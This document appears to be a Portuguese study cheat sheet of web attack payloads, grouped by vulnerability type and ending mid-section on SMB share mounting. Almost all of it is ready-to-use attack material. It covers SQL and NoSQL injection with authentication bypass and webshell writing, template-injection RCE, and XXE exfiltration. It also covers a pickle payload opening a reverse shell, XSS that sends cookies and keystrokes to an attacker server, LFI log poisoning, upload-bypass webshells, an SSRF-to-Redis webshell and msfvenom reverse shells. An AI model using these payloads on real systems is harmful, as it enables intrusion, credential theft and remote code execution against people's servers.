# 🎯 Payloads - Web Hacking

> Payloads organizados por tipo de vulnerabilidade com base nas anotações de estudo.

---


---

# 💉 SQL Injection — Família Completa


## 💉 SQL Injection Manual

### Detecção
```sql
'
''
' OR '1'='1
' OR 1=1 --
' OR 1=1 #
```

### Descobrir número de colunas (ORDER BY)
```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
-- Continue até dar erro para saber o total
```

### UNION SELECT — Identificar colunas visíveis
```sql
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 1, 2, 3 --
```

### Fingerprint — Informações do banco
```sql
' UNION SELECT 1, @@version, 3 --          -- Versão do MySQL
' UNION SELECT 1, database(), 3 --         -- Banco de dados atual
' UNION SELECT 1, user(), 3 --             -- Usuário do banco
' UNION SELECT 1, @@datadir, 3 --          -- Diretório de dados
```

### Listar tabelas via information_schema
```sql
' UNION SELECT 1, table_name, 3 FROM information_schema.tables --

-- Filtrar pelo banco atual
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() --
```

### Listar colunas de uma tabela
```sql
') UNION SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_name = 'users' -- -
```

### Extrair dados de uma tabela
```sql
' UNION SELECT 1, username, password FROM users --
' UNION SELECT 1, concat(username,':',password), 3 FROM users --
```

### Authentication Bypass
```sql
admin' --
admin' #
' OR 1=1 --
' OR '1'='1' --
' OR 1=1 LIMIT 1 --
admin'/*
' OR 1=1;--
" OR ""="
```

### SQLi — PostgreSQL
```sql
-- Fingerprint
' UNION SELECT NULL, version(), NULL --
' UNION SELECT NULL, current_database(), NULL --
' UNION SELECT NULL, current_user, NULL --

-- Listar tabelas
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema='public' --

-- Listar colunas
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' --

-- Ler arquivos do sistema (requer superuser)
' UNION SELECT NULL, pg_read_file('/etc/passwd'), NULL --

-- RCE (requer superuser)
'; COPY cmd_exec FROM PROGRAM 'id'; --
```

### SQLi — MSSQL (Microsoft SQL Server)
```sql
-- Fingerprint
' UNION SELECT NULL, @@version, NULL --
' UNION SELECT NULL, DB_NAME(), NULL --
' UNION SELECT NULL, SYSTEM_USER, NULL --

-- Listar tabelas
' UNION SELECT NULL, name, NULL FROM sysobjects WHERE xtype='U' --

-- Listar colunas
' UNION SELECT NULL, name, NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users') --

-- RCE via xp_cmdshell (se habilitado)
'; EXEC xp_cmdshell 'whoami'; --

-- Habilitar xp_cmdshell (requer admin)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
```

### SQLi — Bypass de WAF
```sql
-- Bypass de espaço (substituir espaço por comentário)
'/**/UNION/**/SELECT/**/1,2,3--
'%09UNION%09SELECT%091,2,3--

-- Bypass com inline comments (MySQL)
/*!50000UNION*//*!50000SELECT*/1,2,3--

-- Bypass de aspas (hex encoding)
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_name=0x7573657273 --

-- Bypass com CHAR()
' UNION SELECT 1, concat(CHAR(117),CHAR(115),CHAR(101),CHAR(114),CHAR(115)), 3 --

-- Double encoding
%2527%2520OR%25201%253D1--
```

---

## 🐚 SQL Injection WebShell

### Identificação de colunas
```sql
' UNION SELECT 1,2,3,4; #
' UNION SELECT 1, @@version, 3, 4; #
' UNION SELECT 1, database(), 3, 4; #
' UNION SELECT 1, user(), 3, 4; #
```

### WebShell via INTO OUTFILE
```sql
' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4 INTO OUTFILE "/var/www/html/cmd.php"; #
```

### Leitura de arquivos do servidor
```sql
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4; #
' UNION SELECT 1, LOAD_FILE('/etc/shadow'), 3, 4; #
' UNION SELECT 1, LOAD_FILE('/var/www/html/config.php'), 3, 4; #
```

### Upgrade para Shell Interativo (após RCE)
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
SHELL=/bin/bash script -q /dev/null
# Ctrl+Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256color
```

---

## ⏱️ SQL Injection Time-Based Blind

### Detecção — Forçar delay
```sql
' AND SLEEP(5) --
' OR SLEEP(5) --
'; WAITFOR DELAY '0:0:5' --          -- Para MSSQL
' AND IF(1=1, SLEEP(5), 0) --
```

### Extrair informações via SUBSTRING + SLEEP
```sql
-- Descobrir primeiro caractere do banco de dados
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --

-- Descobrir tamanho do nome do banco
' AND IF(LENGTH(database())=5, SLEEP(5), 0) --

-- Extrair versão caractere por caractere
' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0) --

-- Verificar se usuário existe
' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')=1, SLEEP(5), 0) --

-- Extrair senha caractere por caractere
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --
```

---

## 🔴 SQL Injection — Error-Based

> Extrai dados via mensagens de erro do banco. Mais rápido que Time-Based — não precisa de delay.

### Detecção
```sql
-- Confirmar que o banco processa e expõe erros
' AND extractvalue(1, 0x7e) -- -
' AND updatexml(1, 0x7e, 1) -- -
```

### extractvalue() — Principal payload
```sql
-- Sintaxe base
' AND extractvalue(1, CONCAT(0x7e, (QUERY_AQUI), 0x7e)) -- -

-- Banco de dados atual
' AND extractvalue(1, CONCAT(0x7e, (SELECT database()), 0x7e)) -- -

-- Versão do MySQL
' AND extractvalue(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- -

-- Usuário do banco
' AND extractvalue(1, CONCAT(0x7e, (SELECT user()), 0x7e)) -- -

-- Listar tabelas
' AND extractvalue(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)) -- -

-- Listar colunas de uma tabela
' AND extractvalue(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 0x7e)) -- -

-- Extrair dados de uma tabela
' AND extractvalue(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 0,1), 0x7e)) -- -

-- Extrair segunda linha (mudar LIMIT)
' AND extractvalue(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1,1), 0x7e)) -- -
```

### updatexml() — Alternativa
```sql
-- Mesma lógica, sintaxe diferente
' AND updatexml(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1) -- -
' AND updatexml(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 0,1), 0x7e), 1) -- -
```

### Contornar o limite de ~32 chars (strings longas)
```sql
-- Usar SUBSTRING para pegar em pedaços
' AND extractvalue(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 30), 0x7e)) -- -
' AND extractvalue(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 0,1), 31, 30), 0x7e)) -- -
```

### Ler arquivo do servidor via Error-Based
```sql
-- Extrair conteúdo de um arquivo via erro
' AND extractvalue(1, CONCAT(0x7e, SUBSTRING(LOAD_FILE('/var/www/html/.env'), 1, 30), 0x7e)) -- -
' AND extractvalue(1, CONCAT(0x7e, SUBSTRING(LOAD_FILE('/etc/passwd'), 1, 30), 0x7e)) -- -
```

### Usando OR em vez de AND (bypass de autenticação)
```sql
-- Funciona mesmo quando a query retorna 0 linhas
%' OR extractvalue(1, CONCAT(0x7e, (SELECT database()), 0x7e)) -- -
1' OR updatexml(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1) -- -
```

### Payload real (formato usado no writeup Laravel-Time)
```sql
' AND extractvalue(1,CONCAT(0x7e,(SELECT password FROM users WHERE name='time'),0x7e))-- -
```

---

## 🗄️ NoSQL Injection

### Bypass de autenticação (MongoDB)
```
# Via URL / form
username[$ne]=null&password[$ne]=null
username[$gt]=""&password[$gt]=""

# Via JSON (Burp Suite)
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "x"}}

# Regex para descobrir usuário
{"username": {"$regex": "^a"}, "password": {"$ne": "x"}}
{"username": {"$regex": "^ad"}, "password": {"$ne": "x"}}
```

### PHP Array Injection (NoSQL)
```
username[$ne]=nada&password[$ne]=nada
username[$gt]=&password[$gt]=
```

---

## 🧩 SSTI — Server-Side Template Injection

> **O que é:** Quando input do usuário é inserido diretamente em um template engine (Jinja2, Twig, ERB, etc.) e processado como código, permitindo RCE.

### Detecção universal
```
# Payloads de teste — se o resultado for "49", o template está processando a expressão
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

### Jinja2 (Python/Flask)
```python
# Leitura de config
{{config}}
{{config.items()}}

# RCE clássico via subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE direto (encontrar a subclass de subprocess.Popen ou os)
{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}

# RCE via import (funciona em versões mais recentes)
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Bypass de filtro de underscores
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Twig (PHP)
```php
# Detecção
{{7*7}}
{{7*'7'}}     # Retorna "49" = Twig

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Leitura de arquivo
{{'cat /etc/passwd'|filter('system')}}
```

### ERB (Ruby)
```ruby
# Detecção
<%= 7*7 %>

# RCE
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

### Freemarker (Java)
```java
# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

---

## 📄 XXE — XML External Entity

> **O que é:** Quando a aplicação processa XML sem desabilitar entidades externas, é possível ler arquivos do servidor, fazer SSRF e até RCE.

### XXE Básico — Leitura de arquivos
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### XXE via SSRF (acessar serviços internos)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Blind XXE — Out-of-Band (OOB) Exfiltration
> Quando o resultado da entidade NÃO é refletido na resposta.
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://SEU-SERVIDOR/xxe.dtd">
  %xxe;
]>
<root>test</root>
```
**Conteúdo do `xxe.dtd` no seu servidor:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://SEU-SERVIDOR/?data=%file;'>">
%eval;
%exfiltrate;
```

### XXE via Upload de Arquivo (SVG, DOCX, XLSX)
```xml
<!-- Arquivo .svg malicioso -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

> **DOCX/XLSX:** Descompactar o arquivo, editar `[Content_Types].xml` ou `word/document.xml` inserindo a entidade XXE, recompactar e fazer upload.

---

## 🧬 Insecure Deserialization

> **O que é:** Quando a aplicação desserializa dados controlados pelo usuário sem validação, permitindo RCE ou manipulação de objetos.

### PHP — Deserialization
```php
# Detectar: procurar por parâmetros com dados serializados do PHP
# Formato: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

# Payload para manipular propriedades do objeto
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

# Ferramentas
# phpggc — Gerador de gadget chains para frameworks PHP
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 exec 'cat /etc/passwd'
```

### Java — Deserialization
```bash
# Detectar: procurar por dados começando com "rO0AB" (base64) ou "aced0005" (hex)
# Isso indica ObjectInputStream do Java

# Ferramentas
# ysoserial — Gerador de payloads de deserialization Java
java -jar ysoserial-all.jar CommonsCollections1 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}' | base64
```

### Python — Pickle Deserialization
```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/SEU_IP/4444 0>&1',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```
> Enviar o payload base64 onde a aplicação espera dados pickle (cookies, APIs, etc.)

### Node.js — node-serialize
```javascript
// Payload para RCE via node-serialize
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(error,stdout,stderr){console.log(stdout)})}()"}
```

---

## 🔍 XSS — Cross-Site Scripting

### XSS Reflected
```html
<!-- Payload básico -->
<script>alert(1)</script>

<!-- Extração de Cookies -->
<script>document.location='http://SEU-SERVIDOR/?c='+document.cookie</script>

<!-- Bypass com encoding -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Bypass com case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Bypass sem aspas -->
<img src=x onerror=alert`1`>

<!-- Bypass via event handlers alternativos -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>

<!-- Bypass de WAF — encoding duplo -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Bypass de WAF — HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Bypass de WAF — JavaScript sem parênteses -->
<img src=x onerror=alert&#40;1&#41;>
<svg onload=alert&lpar;1&rpar;>

<!-- Bypass de WAF — concatenação e eval -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=self['al'+'ert'](1)>

<!-- Bypass de WAF — tag SVG com encoding -->
<svg/onload=alert(1)>
<svg%0Aonload=alert(1)>
<svg%09onload=alert(1)>
<svg%0Donload=alert(1)>
```

### XSS Stored
```html
<!-- Payload em campo de comentário/nome -->
<script>fetch('http://SEU-SERVIDOR/?cookie='+btoa(document.cookie))</script>

<!-- Keylogger básico -->
<script>
document.onkeypress = function(e) {
  fetch('http://SEU-SERVIDOR/?k=' + e.key);
}
</script>

<!-- Roubo de sessão via redirect -->
<script>window.location='http://SEU-SERVIDOR/?s='+document.cookie</script>

<!-- Phishing via HTML injection (roubo de senhas) -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
<h2>Sessão expirada. Faça login novamente:</h2>
<form action="http://SEU-SERVIDOR/capture" method="POST">
<input name="user" placeholder="Usuário"><br>
<input name="pass" type="password" placeholder="Senha"><br>
<button>Login</button></form></div>

<!-- Exfiltração de dados do DOM -->
<script>
fetch('http://SEU-SERVIDOR/?page='+btoa(document.body.innerHTML))
</script>
```

### XSS DOM Based
```html
<!-- Quando a entrada vai direto ao DOM via innerHTML -->
#<img src=x onerror=alert(1)>

<!-- Exploração via hash da URL -->
javascript:alert(document.domain)

<!-- Payload em parâmetro que vai ao DOM -->
?search=<script>alert(1)</script>

<!-- DOM XSS via document.write -->
?q="><script>alert(1)</script>

<!-- DOM XSS via jQuery .html() ou .append() -->
?name=<img src=x onerror=alert(1)>
```

### Blind XSS
> **Quando usar:** Quando a entrada do usuário é processada em outro lugar (ex: painel de admin, tickets de suporte). Você não vê o resultado, mas o payload executa quando um admin visualiza.
```html
<!-- Payload que "liga de volta" para seu servidor quando executado -->
"><script src=http://SEU-SERVIDOR/xss.js></script>
"><img src=x onerror=fetch('http://SEU-SERVIDOR/?c='+document.cookie)>

<!-- Conteúdo do xss.js para captura completa -->
<!--
var data = 'url=' + encodeURIComponent(document.URL);
data += '&cookie=' + encodeURIComponent(document.cookie);
data += '&dom=' + encodeURIComponent(document.body.innerHTML);
fetch('http://SEU-SERVIDOR/log', {method:'POST', body:data});
-->
```

### XSS Polyglot (funciona em múltiplos contextos)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik22telerik33telerik44telerik55telerik66telerik77telerik88telerik99/telerik//>%0telerik<svg/onload=alert()>
```

---

---

# 🔐 Autenticação & Sessão


## 🔄 CSRF — Cross-Site Request Forgery

### HTML Form Attack
```html
<!-- Formulário malicioso que submete automaticamente -->
<html>
  <body>
    <form id="csrf-form" action="http://ALVO.COM/change-password" method="POST">
      <input type="hidden" name="password" value="hacked123">
      <input type="hidden" name="confirm_password" value="hacked123">
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
  </body>
</html>
```

### Via GET (caso o endpoint aceite GET)
```html
<img src="http://ALVO.COM/delete-account?id=123" width="0" height="0">
```

### Via XHR (para APIs)
```javascript
fetch('http://ALVO.COM/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```

---

## ↩️ Open Redirect

> **O que é:** Quando a aplicação redireciona para URLs externas sem validação. Usado para phishing, roubo de tokens OAuth, e bypass de filtros.

### Payloads comuns
```
# Parâmetros comuns de redirect
?redirect=http://evil.com
?url=http://evil.com
?next=http://evil.com
?return=http://evil.com
?rurl=http://evil.com
?dest=http://evil.com
?destination=http://evil.com
?continue=http://evil.com
?redirect_uri=http://evil.com

# Bypass de filtros que verificam o domínio
?redirect=http://evil.com%23.alvo.com        # Fragment
?redirect=http://alvo.com.evil.com            # Subdomínio falso
?redirect=http://alvo.com@evil.com            # Basic Auth trick
?redirect=//evil.com                           # Protocol-relative
?redirect=\/\/evil.com                         # Escaped
?redirect=http://evil.com%00.alvo.com          # Null byte
?redirect=https://evil.com?alvo.com            # Query string
?redirect=http://evil.com#alvo.com             # Fragment
```

---

## 🔑 JWT — JSON Web Token Attacks

> **O que é:** JWTs são usados para autenticação stateless. Tokens mal implementados podem ser forjados ou manipulados.

### Estrutura do JWT
```
HEADER.PAYLOAD.SIGNATURE
# Decodificar (é apenas base64url):
echo "HEADER_AQUI" | base64 -d
echo "PAYLOAD_AQUI" | base64 -d
```

### Ataque `alg: none` (sem assinatura)
> Remove a verificação de assinatura quando o servidor aceita `"alg": "none"`.
```json
// Header original:
{"alg": "HS256", "typ": "JWT"}

// Header modificado:
{"alg": "none", "typ": "JWT"}
```
```bash
# Gerar token sem assinatura (terminar com ponto sem conteúdo após):
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
echo -n '{"sub":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
# Token final: HEADER.PAYLOAD.  (sem signature, mas com o ponto final)
```

### Brute Force de Secret Key
```bash
# Com hashcat
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# Com jwt_tool
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Com john
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

### Key Confusion Attack (RS256 → HS256)
> Quando o servidor usa RS256 (assimétrica) mas aceita HS256 (simétrica), você pode assinar o token com a chave **pública** como se fosse o segredo HMAC.
```bash
# 1. Obter a chave pública do servidor (geralmente em /jwks.json, /.well-known/jwks.json)
# 2. Forjar o token usando a chave pública como secret
python3 jwt_tool.py TOKEN -X k -pk public_key.pem
```

### Ferramentas úteis
```bash
# jwt_tool — Canivete suíço para JWT
python3 jwt_tool.py TOKEN                  # Decodificar
python3 jwt_tool.py TOKEN -T               # Editar interativamente (tampering)
python3 jwt_tool.py TOKEN -I -pc role -pv admin  # Injetar claim

# jwt.io — Decodificador online (cuidado com tokens sensíveis)
```

---

## 🔐 IDOR — Insecure Direct Object Reference

### Testes de IDOR
```
# Alterar IDs em parâmetros
GET /api/user/1234/profile    → Tentar 1235, 1236...
GET /document?id=100          → Tentar id=101, 99, 1...

# Alterar IDs em cookies/headers
Cookie: userId=1234           → Tentar valores diferentes

# Enumerar via Fuzzing (wfuzz)
wfuzz -c -z range,1-1000 -H "Cookie: PHPSESSID=SUASESSAO" "http://ALVO.COM/?user_id=FUZZ"

# Alterar método HTTP
POST /api/delete → PUT /api/delete (às vezes com permissões diferentes)
```

---

---

# 📁 File Attacks


## 📁 Local File Inclusion (LFI)

### Path Traversal básico
```
../../../etc/passwd
../../../../etc/passwd
../../../../../../etc/passwd

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Arquivos úteis para ler (Linux)
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/www/html/config.php
/var/www/html/.env
/home/usuario/.ssh/id_rsa
/home/usuario/.ssh/authorized_keys
/root/.ssh/id_rsa
```

### Arquivos úteis para ler (Windows)
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\Users\Administrator\Desktop\
```

### Bypass de filtros
```
....//....//....//etc/passwd         # Bypass de substituição simples de ../
..././..././..././etc/passwd
/etc/passwd%00.jpg                   # Null byte (PHP < 5.3.4)
php://filter/convert.base64-encode/resource=/etc/passwd  # PHP wrapper
..%252f..%252f..%252fetc%252fpasswd  # Double URL encode
..%c0%af..%c0%af..%c0%afetc/passwd  # UTF-8 overlong encoding
/....//....//....//etc/passwd        # Bypass de filtros que removem ../ uma vez
```

### PHP Wrappers
```
php://filter/convert.base64-encode/resource=index.php
php://input   (com POST: <?php system('id'); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id   (requer expect wrapper habilitado)
phar://arquivo.phar/test.txt
zip://arquivo.zip%23test.txt
```

### LFI → RCE via Log Poisoning
> **Técnica:** Injeta código PHP nos logs do servidor (via User-Agent, URL, etc.) e depois inclui o arquivo de log via LFI para executar o código.

```bash
# 1. Envenenar o log do Apache com um User-Agent malicioso
curl -A "<?php system(\$_GET['cmd']); ?>" http://ALVO.COM/

# 2. Incluir o log via LFI para executar comandos
http://ALVO.COM/page?file=../../../../var/log/apache2/access.log&cmd=id

# Variante: envenenar via SSH (auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@ALVO.COM
# Depois incluir:
http://ALVO.COM/page?file=../../../../var/log/auth.log&cmd=id

# Variante: envenenar via email (mail log)
# Enviar email com payload PHP no assunto/corpo para o servidor
```

### Remote File Inclusion (RFI)
> **Requisito:** `allow_url_include=On` no php.ini (raro, mas existe em sistemas legados).
```
http://ALVO.COM/page?file=http://SEU-SERVIDOR/shell.txt
http://ALVO.COM/page?file=http://SEU-SERVIDOR/shell.txt%00
```
```

---

## 📤 File Upload Bypass

> **O que é:** Quando a aplicação permite upload de arquivos mas tenta filtrar extensões perigosas. O objetivo é fazer upload de uma webshell.

### Webshell PHP mínima
```php
<?php system($_GET['cmd']); ?>
```

### Bypass de extensão
```
# Extensões alternativas de PHP
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.phar
shell.phps
shell.pht

# Double extension
shell.php.jpg
shell.php.png
shell.jpg.php

# Null byte (PHP antigo < 5.3.4)
shell.php%00.jpg
shell.php\x00.jpg

# Case variation
shell.pHp
shell.PhP

# Trailing characters
shell.php.
shell.php...
shell.php%20
shell.php%0a
shell.php%0d%0a
```

### Bypass de Content-Type
```
# Enviar como imagem no header Content-Type
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Mas o corpo do arquivo contém PHP:
<?php system($_GET['cmd']); ?>
```

### Bypass com Magic Bytes (GIF header)
```
GIF89a;<?php system($_GET['cmd']); ?>
```
> Salvar como `shell.php.gif` ou `shell.gif.php`. O `GIF89a` no início faz o servidor pensar que é um GIF legítimo.

### Bypass via .htaccess upload
```apache
# Fazer upload de um .htaccess que trata .jpg como PHP
AddType application/x-httpd-php .jpg
```
> Depois, fazer upload de um arquivo `shell.jpg` contendo código PHP.

### Upload para diretórios alternativos (Path Traversal)
```
# No campo filename do upload, tentar:
filename="../../../var/www/html/shell.php"
filename="....//....//....//var/www/html/shell.php"
```

---

---

# 🌐 Server-Side Attacks


## 🌐 SSRF — Server-Side Request Forgery

> **O que é:** O servidor faz requisições HTTP a um destino controlado pelo atacante. Permite acessar serviços internos, metadados de cloud e bypasses de firewall.

### Payloads básicos
```
# Acessar serviços internos
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]          # IPv6 localhost

# Acessar outras portas internas
http://127.0.0.1:8080
http://127.0.0.1:3306    # MySQL
http://127.0.0.1:6379    # Redis
http://127.0.0.1:27017   # MongoDB
http://127.0.0.1:9200    # Elasticsearch
```

### Cloud Metadata Endpoints
```
# AWS (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
# (Requer header: Metadata-Flavor: Google)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# (Requer header: Metadata: true)

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### Bypass de filtros de SSRF
```
# Bypass de blacklist de "localhost" e "127.0.0.1"
http://2130706433         # 127.0.0.1 em decimal
http://0x7f000001         # 127.0.0.1 em hex
http://017700000001       # 127.0.0.1 em octal
http://127.1              # Shorthand
http://127.0.0.1.nip.io   # DNS rebinding via nip.io
http://0                  # Resolve para 0.0.0.0

# Bypass via redirect
# Hospedar em SEU-SERVIDOR um redirect 302 para http://127.0.0.1

# Bypass via URL parsing
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
```

### SSRF → RCE (via serviços internos)
```bash
# Redis (porta 6379) — Escrever webshell via protocolo Redis
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$11%0d%0ashell_value%0d%0a$31%0d%0a<?php system($_GET['cmd']); ?>%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```

---

## ⚙️ Security Misconfiguration

### Gerar Reverse Shell com msfvenom
```bash
# WAR (para Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST=SEU-IP LPORT=4444 -f war -o shell.war

# PHP
msfvenom -p php/reverse_php LHOST=SEU-IP LPORT=4444 -f raw -o shell.php

# Linux ELF
msfvenom -p linux/x86/shell_reverse_tcp LHOST=SEU-IP LPORT=4444 -f elf -o shell

# Windows EXE
msfvenom -p windows/shell_reverse_tcp LHOST=SEU-IP LPORT=4444 -f exe -o shell.exe
```

### Listener com Netcat
```bash
nc -lvnp 4444
```

---

## 🌐 Subdomain Takeover

### Verificar CNAME apontando para serviço externo
```bash
# Verificar DNS
dig CNAME subdominio.alvo.com
nslookup subdominio.alvo.com

# Ferramentas automáticas
subfinder -d alvo.com -silent | httpx -sc -title
nuclei -t takeovers/ -u subdominio.alvo.com
```

---

## 🖧 SMB — Server Message Block

> Protocolo de compartilhamento de arquivos em redes. Portas **139** (NetBIOS) e **445** (SMB direto).

### Enumeração Anônima (Null Session)
```bash
# Listar compartilhamentos sem senha
smbclient -L //ALVO -N

# Verificar permissões de todos os shares
smbmap -H ALVO -u "" -p ""

# Enumeração completa (usuários, shares, políticas, grupos)
enum4linux -a ALVO

# NetExec com null session
nxc smb ALVO -u "" -p "" --shares

# Verificar se login anônimo está habilitado
nxc smb ALVO -u "Guest" -p "" --shares
```

### Autenticação com Credenciais
```bash
# Listar shares autenticado
smbclient -L //ALVO -U usuario%senha

# Conectar em share específico
smbclient //ALVO/NOME_SHARE -U usuario%senha

# Validar credenciais + listar shares (NetExec)
nxc smb ALVO -u usuario -p senha --shares

# Autenticação local (sem domínio)
nxc smb ALVO -u usuario -p senha --local-auth --shares

# Verificar se é admin local
nxc smb ALVO -u usuario -p senha
# Saída "[+]" = usuário válido | "(Pwn3d!)" = admin local
```

### Comandos dentro do smbclient
```bash
# Após conectar: smbclient //ALVO/share -U user%pass
ls                    # Listar arquivos e diretórios
cd pasta/             # Navegar para pasta
get arquivo.txt       # Baixar arquivo para sua máquina
put shell.php         # Enviar arquivo para o servidor
mget *                # Baixar todos os arquivos
mput *.php            # Enviar todos os .php
mkdir nova_pasta      # Criar diretório
del arquivo.txt       # Deletar arquivo
pwd                   # Ver diretório atual no servidor
lcd /tmp              # Mudar diretório LOCAL (de download)
exit                  # Sair
```

### Download Recursivo de Todo o Share
```bash
# Baixar todos os arquivos de uma vez
smbclient //ALVO/share -U usuario%senha -c "prompt OFF; recurse ON; mget *"

# Usando smbget
smbget -R smb://ALVO/share -U usuario%senha
```

### Montar Share como Pasta Local
```bash
# Montar o compartilhamento (requer cifs-utils)
